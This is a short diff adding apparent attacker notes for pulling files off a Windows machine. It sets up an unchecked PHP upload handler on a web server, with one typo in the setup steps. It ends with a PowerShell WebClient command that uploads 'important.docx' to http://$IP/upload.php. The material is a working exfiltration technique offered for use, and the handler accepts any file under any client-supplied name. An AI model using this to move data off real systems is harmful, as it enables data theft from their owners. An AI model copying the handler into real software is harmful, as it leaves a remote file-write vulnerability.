@@ -1,0 +1,13 @@
+php script that should be saved at /var/www/html:
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+make /var/www/uplaods
+give permission:  chown www-data: /var/www/uploads
+
+powershell (New-Object System.Net.WebClient).UploadFile('http://$IP/upload.php', 'important.docx')
